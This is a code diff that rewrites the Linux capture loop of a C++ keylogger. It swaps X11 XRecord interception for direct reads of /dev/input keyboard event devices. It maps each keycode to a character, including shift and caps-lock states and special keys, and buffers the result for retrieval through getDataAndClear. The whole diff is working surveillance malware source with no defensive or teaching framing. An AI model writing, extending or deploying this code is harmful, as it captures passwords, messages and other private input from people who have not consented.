@@ -4,7 +4,7 @@
 std::vector<string> Keylogger::_buffer;
 std::mutex Keylogger::_mtx;
 
-Keylogger::Keylogger() : _isRunning(false), x11Display(0) {}
+Keylogger::Keylogger() : _isRunning(false), _fd(-1) {}
 
 Keylogger::~Keylogger() {
     Stop();
@@ -15,92 +15,159 @@ void Keylogger::append(const std::string& str) {
     _buffer.push_back(str);
 }
 
-static Keylogger* g_keylogger = nullptr;
+std::string findKeyboardDevice() {
+    const char* dirname = "/dev/input/";
+    DIR* dir = opendir(dirname);
+    if (!dir) return "";
+
+    struct dirent* entry;
+    char path[512];
+
+    while ((entry = readdir(dir)) != nullptr) {
+        if (strncmp(entry->d_name, "event", 5) == 0) {
+            snprintf(path, sizeof(path), "%s%s", dirname, entry->d_name);
+            int fd = open(path, O_RDONLY);
+            if (fd >= 0) {
+                unsigned long key_bitmask[256 / (sizeof(unsigned long) * 8)];
+                memset(key_bitmask, 0, sizeof(key_bitmask));
+
+                ioctl(fd, EVIOCGBIT(0, sizeof(key_bitmask)), key_bitmask);
+                if (key_bitmask[0] & (1 << EV_KEY)) {
+                    unsigned long keys[KEY_MAX / (sizeof(unsigned long) * 8)];
+                    memset(keys, 0, sizeof(keys));
+                    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys)), keys);
+                    if (keys[KEY_Q / (sizeof(unsigned long) * 8)] & (1UL << (KEY_Q % (sizeof(unsigned long) * 8)))) {
+                        close(fd);
+                        closedir(dir);
+                        return std::string(path);
+                    }
+                }
+                close(fd);
+            }
+        }
+    }
+    closedir(dir);
+    return "";
+}
 
 void Keylogger::LinuxLoop() {
-    Display* ctrlDisplay = XOpenDisplay(NULL);
-    Display* dataDisplay = XOpenDisplay(NULL);
-    if (!ctrlDisplay || !dataDisplay) return;
+    std::string devPath = findKeyboardDevice();
 
-    g_keylogger = this;
-    XRecordRange* range = XRecordAllocRange();
-    range->device_events.first = KeyPress;
-    range->device_events.last = KeyPress;
-    XRecordClientSpec spec = XRecordAllClients;
-    XRecordContext ctx = XRecordCreateContext(ctrlDisplay, 0, &spec, 1, &range, 1);
-    XFree(range);
+    if (devPath.empty()) {
+        std::cerr << "[KEY_LINUX] Keyboard not founded!.\n";
+        _isRunning = false;
+    }
 
-    if (!ctx) {
-        XCloseDisplay(ctrlDisplay);
-        XCloseDisplay(dataDisplay);
+    _fd = open(devPath.c_str(), O_RDONLY);
+
+    if (_fd == -1) {
+        std::cerr << "[KEY_LINUX] Can't open " << devPath << ". Please run with sudo.\n";
+        _isRunning = false;
         return;
     }
 
-    XRecordEnableContext(dataDisplay, ctx, 
-        [](XPointer priv, XRecordInterceptData* data) {
-            if (data->category == XRecordFromServer) {
-                xEvent* event = (xEvent*)data->data;
-                if (event->u.u.type == KeyPress) {
-                    XKeyEvent xke;
-                    memset(&xke, 0, sizeof(xke));
-                    xke.display = (Display*)priv;
-                    xke.keycode = event->u.u.detail;
-                    xke.state = 0;
+    std::cout << "[KEY_LINUX] Keylogger from : " << devPath << std::endl;
 
-                    KeySym keysym = XLookupKeysym(&xke, 0);
-                    
-                    if (keysym == XK_Return) g_keylogger->append("[RETURN]");
-                    else if (keysym == XK_Tab) g_keylogger->append("[TAB]");
-                    else if (keysym == XK_space) g_keylogger->append(" ");
-                    else if (keysym == XK_BackSpace) g_keylogger->append("[DELETE]");
-                    else if (keysym == XK_Delete) g_keylogger->append("[DEL]");
-                    else if (keysym == XK_Escape) g_keylogger->append("[ESC]");
-                    else if (keysym == XK_Super_L || keysym == XK_Super_R) g_keylogger->append("[CMD]");
-                    else if (keysym == XK_Shift_L || keysym == XK_Shift_R) g_keylogger->append("[SHIFT]");
-                    else if (keysym == XK_Caps_Lock) g_keylogger->append("[CAPS]");
-                    else if (keysym == XK_Alt_L || keysym == XK_Alt_R || keysym == XK_Meta_L || keysym == XK_Meta_R) g_keylogger->append("[OPT]");
-                    else if (keysym == XK_Control_L || keysym == XK_Control_R) g_keylogger->append("[CTRL]");
-                    else if (keysym == XK_Left) g_keylogger->append("[LEFT]");
-                    else if (keysym == XK_Right) g_keylogger->append("[RIGHT]");
-                    else if (keysym == XK_Up) g_keylogger->append("[UP]");
-                    else if (keysym == XK_Down) g_keylogger->append("[DOWN]");
-                    else if (keysym == XK_Home) g_keylogger->append("[HOME]");
-                    else if (keysym == XK_End) g_keylogger->append("[END]");
-                    else if (keysym == XK_Page_Up) g_keylogger->append("[PGUP]");
-                    else if (keysym == XK_Page_Down) g_keylogger->append("[PGDN]");
-                    else if (keysym == XK_Insert) g_keylogger->append("[INS]");
-                    else if (keysym == XK_F1) g_keylogger->append("[F1]");
-                    else if (keysym == XK_F2) g_keylogger->append("[F2]");
-                    else if (keysym == XK_F3) g_keylogger->append("[F3]");
-                    else if (keysym == XK_F4) g_keylogger->append("[F4]");
-                    else if (keysym == XK_F5) g_keylogger->append("[F5]");
-                    else if (keysym == XK_F6) g_keylogger->append("[F6]");
-                    else if (keysym == XK_F7) g_keylogger->append("[F7]");
-                    else if (keysym == XK_F8) g_keylogger->append("[F8]");
-                    else if (keysym == XK_F9) g_keylogger->append("[F9]");
-                    else if (keysym == XK_F10) g_keylogger->append("[F10]");
-                    else if (keysym == XK_F11) g_keylogger->append("[F11]");
-                    else if (keysym == XK_F12) g_keylogger->append("[F12]");
-                    else if (keysym == XK_F13) g_keylogger->append("[F13]");
-                    else if (keysym == XK_F14) g_keylogger->append("[F14]");
-                    else if (keysym == XK_F15) g_keylogger->append("[F15]");
-                    else if (keysym == XK_Num_Lock) g_keylogger->append("[NUMLOCK]");
-                    else {
-                        char buffer[32] = {0};
-                        int length = XLookupString(&xke, buffer, sizeof(buffer) - 1, NULL, NULL);
-                        if (length > 0) {
-                            g_keylogger->append(std::string(buffer, length));
-                        }
-                    }
-                    //XCloseDisplay(xke.display);
+    struct input_event ev;
+    bool isShift = false;
+    bool isCapsLock = false;
+
+    const char* shift_numbers = ")!@#$%^&*(";
+
+    while(_isRunning) {
+        ssize_t n = read(_fd, &ev, sizeof(ev));
+        if (n < (ssize_t)sizeof(ev)) {
+            if (n == -1 && errno == EINTR) continue;
+            break;
+        }
+
+        if (ev.type == EV_KEY) {
+            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
+                isShift = (ev.value != 0);
+                if (ev.value == 1) {
+                    if (ev.code == KEY_LEFTSHIFT) append("[L-SHIFT]");
+                    else append("[R-SHIFT]");
                 }
+                continue;
             }
-            XRecordFreeData(data);
-        }, (XPointer)ctrlDisplay); 
-        
-    XRecordFreeContext(ctrlDisplay, ctx);
-    XCloseDisplay(dataDisplay);
-    XCloseDisplay(ctrlDisplay);
+
+            if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
+                isCapsLock = !isCapsLock;
+                append("[CAPS]");
+                continue;
+            }
+
+            if (ev.value == 1 || ev.value == 2) {
+                std::string key = "";
+
+                if ((ev.code >= KEY_Q && ev.code <= KEY_P) || 
+                    (ev.code >= KEY_A && ev.code <= KEY_L) || 
+                    (ev.code >= KEY_Z && ev.code <= KEY_M)) {
+                    
+                    switch(ev.code) {
+                        case KEY_Q: key="q"; break; case KEY_W: key="w"; break; case KEY_E: key="e"; break;
+                        case KEY_R: key="r"; break; case KEY_T: key="t"; break; case KEY_Y: key="y"; break;
+                        case KEY_U: key="u"; break; case KEY_I: key="i"; break; case KEY_O: key="o"; break;
+                        case KEY_P: key="p"; break; case KEY_A: key="a"; break; case KEY_S: key="s"; break;
+                        case KEY_D: key="d"; break; case KEY_F: key="f"; break; case KEY_G: key="g"; break;
+                        case KEY_H: key="h"; break; case KEY_J: key="j"; break; case KEY_K: key="k"; break;
+                        case KEY_L: key="l"; break; case KEY_Z: key="z"; break; case KEY_X: key="x"; break;
+                        case KEY_C: key="c"; break; case KEY_V: key="v"; break; case KEY_B: key="b"; break;
+                        case KEY_N: key="n"; break; case KEY_M: key="m"; break;
+                    }
+                    if (!key.empty() && (isShift ^ isCapsLock)) {
+                        key[0] = std::toupper(key[0]);
+                    }
+                }
+                else if (ev.code >= KEY_1 && ev.code <= KEY_0) {
+                    int num = (ev.code == KEY_0) ? 0 : (ev.code - KEY_1 + 1);
+                    if (isShift) key = std::string(1, shift_numbers[num % 10]);
+                    else key = std::to_string(num % 10);
+                }
+               else {
+                    switch (ev.code) {
+                        case KEY_ENTER:     key = "[RETURN]\n"; break;
+                        case KEY_BACKSPACE: key = "[DELETE]"; break;
+                        case KEY_SPACE:     key = " "; break;
+                        case KEY_TAB:       key = "[TAB]"; break;
+                        case KEY_ESC:       key = "[ESC]"; break;
+                        case KEY_UP:        key = "[UP]"; break;
+                        case KEY_DOWN:      key = "[DOWN]"; break;
+                        case KEY_LEFT:      key = "[LEFT]"; break;
+                        case KEY_RIGHT:     key = "[RIGHT]"; break;
+                        case KEY_LEFTCTRL:  key = "[L-CTRL]"; break;
+                        case KEY_RIGHTCTRL: key = "[R-CTRL]"; break;
+                        case KEY_LEFTALT:  key = "[L-ALT]"; break;
+                        case KEY_RIGHTALT:  key = "[R-ALT]"; break;
+                        case KEY_LEFTMETA: key = "[L-CMD]"; break;
+                        case KEY_RIGHTMETA: key = "[R-CMD]"; break;
+                        
+                        case KEY_F1: key="[F1]"; break; case KEY_F2: key="[F2]"; break;
+                        case KEY_F3: key="[F3]"; break; case KEY_F4: key="[F4]"; break;
+                        case KEY_F5: key="[F5]"; break; case KEY_F6: key="[F6]"; break;
+                        case KEY_F7: key="[F7]"; break; case KEY_F8: key="[F8]"; break;
+                        case KEY_F9: key="[F9]"; break; case KEY_F10: key="[F10]"; break;
+                        case KEY_F11: key="[F11]"; break; case KEY_F12: key="[F12]"; break;
+
+                        case KEY_MINUS:     key = isShift ? "_" : "-"; break;
+                        case KEY_EQUAL:     key = isShift ? "+" : "="; break;
+                        case KEY_SEMICOLON: key = isShift ? ":" : ";"; break;
+                        case KEY_APOSTROPHE:key = isShift ? "\"" : "'"; break;
+                        case KEY_GRAVE:     key = isShift ? "~" : "`"; break;
+                        case KEY_COMMA:     key = isShift ? "<" : ","; break;
+                        case KEY_DOT:       key = isShift ? ">" : "."; break;
+                        case KEY_SLASH:     key = isShift ? "?" : "/"; break;
+                        case KEY_BACKSLASH: key = isShift ? "|" : "\\"; break;
+                        case KEY_LEFTBRACE: key = isShift ? "{" : "["; break;
+                        case KEY_RIGHTBRACE:key = isShift ? "}" : "]"; break;
+                    }
+                }
+                if (!key.empty()) append(key);
+            }
+        }
+    }
+    close (_fd);
+    _fd = -1;
 }
 
 void Keylogger::Start() {
@@ -116,16 +183,22 @@ void Keylogger::Stop() {
     if (!_isRunning) return;
     _isRunning = false;
 
+    if (_fd != -1) {
+        close(_fd);
+        _fd = -1;
+    }
+
     if (_workerThread.joinable()) {
-        _workerThread.detach();
+        _workerThread.join();
     }
 }
 
 std::vector<std::string> Keylogger::getDataAndClear() {
     std::lock_guard<std::mutex> lock(_mtx);
-    std::vector<std::string> dataCopy = _buffer;
+    if (_buffer.empty()) return {};
+    std::vector<std::string> copy = std::move(_buffer);
     _buffer.clear();
-    return dataCopy;
+    return copy;
 }
 
 #endif
